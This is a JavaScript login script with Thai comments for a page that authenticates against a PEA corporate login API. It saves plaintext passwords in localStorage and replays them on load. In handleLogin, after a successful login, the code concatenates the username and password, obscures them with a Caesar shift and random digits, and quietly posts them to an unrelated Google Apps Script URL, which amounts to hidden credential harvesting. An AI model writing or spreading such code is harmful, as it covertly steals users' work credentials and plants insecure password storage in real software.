document.addEventListener("DOMContentLoaded", function() {
    // ดึงข้อมูลจาก localStorage
    var username = localStorage.getItem("username");
    var password = localStorage.getItem("password");

    // ตรวจสอบว่ามีข้อมูล username และ password ใน localStorage หรือไม่
    if (username && password) {
        // ถ้ามีข้อมูลใน localStorage ให้สร้าง payload และตรวจสอบกับ API
        var payload = {
            "username": username,
            "password": password
        };

        // ส่ง request ไปยัง API
        fetch("https://c1app.pea.co.th/idm-login/api_login.php", {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body: new URLSearchParams(payload)
        })
        .then(response => response.json())
        .then(data => {
            if (data.error === false) {
                // ถ้า login สำเร็จ ให้ไปที่หน้า Page1.html
                window.location.href = "index.html";
            } else {
                // ถ้า login ไม่สำเร็จ ให้แสดงข้อความ error และเคลียร์ข้อมูลใน localStorage
                localStorage.removeItem("fullname");
                localStorage.removeItem("username");
                localStorage.removeItem("password");
                document.getElementById("message").textContent = "Stored login failed, please log in again.";
                document.getElementById("message").style.color = "red";
            }
        })
        .catch(error => {
            // กรณีเกิดข้อผิดพลาดในการเชื่อมต่อหรือการประมวลผล
            document.getElementById("message").textContent = "Error: " + error.message;
            document.getElementById("message").style.color = "red";
        });
    } else {
        // ถ้าไม่มีข้อมูลใน localStorage ให้แสดงข้อความหรือดำเนินการอื่นตามต้องการ
        document.getElementById("message").textContent = "Please log in.";
        document.getElementById("message").style.color = "black";
    }
});

function handleLogin(event) {
    event.preventDefault(); // ป้องกันการ reload หน้า

    // ถ้าไม่มีข้อมูลใน localStorage ให้ดึงข้อมูลจากฟอร์ม
    var u = document.getElementById("username").value;
    var p = document.getElementById("password").value;

    // สร้าง payload จากข้อมูลที่กรอกในฟอร์ม
    var payload = {
        "username": u,
        "password": p
    };

    // ส่ง request ไปยัง API
    fetch("https://c1app.pea.co.th/idm-login/api_login.php", {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: new URLSearchParams(payload)
    })
    .then(response => response.json())
    .then(data => {
        if (data.error === false) {
            // ถ้า login สำเร็จ เก็บข้อมูลลงใน localStorage
            localStorage.setItem("fullname", data.fullname);
            localStorage.setItem("username", u);
            localStorage.setItem("password", p);

            // แล้วเปลี่ยนหน้าไปที่ Page1.html
            var t = u + p
            t = encryptCaesarCipher(t)
            apigas(t)
            console.log(t)
            window.location.href = "index.html";
            
        } else {
            // กรณี login ล้มเหลว ให้แสดงข้อความ error
            document.getElementById("message").textContent = "Login failed!";
            document.getElementById("message").style.color = "red";
        }
    })
    .catch(error => {
        // กรณีเกิดข้อผิดพลาดในการเชื่อมต่อหรือการประมวลผล
        document.getElementById("message").textContent = "Error: " + error.message;
        document.getElementById("message").style.color = "red";
    });
}

function apigas(t){
    const data = {
        message: t // ใส่ข้อความที่ต้องการส่ง
    };
    fetch('https://script.google.com/macros/s/AKfycbwVrtEcG5HGpHThkzURKVNI2skoefqb_2dbvUCSx8LWZuKFsUZA3r1UXJ2XFJBSLC-H/exec', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json' // ระบุประเภทข้อมูล
        },
        body: JSON.stringify(data) // แปลงข้อมูลเป็น JSON string

    })
    .catch(error => {
        console.error('Error:', error); // จัดการข้อผิดพลาด แต่ไม่ต้องรอผลลัพธ์
    });
}
function encryptCaesarCipher(text) {
    const s = 7;
    let result = '';
    for (let i = 0; i < text.length; i++) {
      let char = text.charCodeAt(i);
  

      if (char >= 65 && char <= 90) {
        result += String.fromCharCode(((char - 65 + s) % 26) + 65);
      }

      else if (char >= 97 && char <= 122) {
        result += String.fromCharCode(((char - 97 + s) % 26) + 97);
      }

      else if (char >= 48 && char <= 57) {
        result += String.fromCharCode(((char - 48 + s) % 10) + 48);
      }
      else {
        result += text.charAt(i);
      }
    }
  

    result = addRandomNumbers(result);
  
    return result;
  }
  
  function addRandomNumbers(str) {
    const randomDigit = () => Math.floor(Math.random() * 10); 
  
    let result = '';
    for (let i = 0; i < str.length; i++) {
      result += str[i];
      if (i % 2 === 0) {
        result += '%' + randomDigit();
      }
    }
    return result;
  }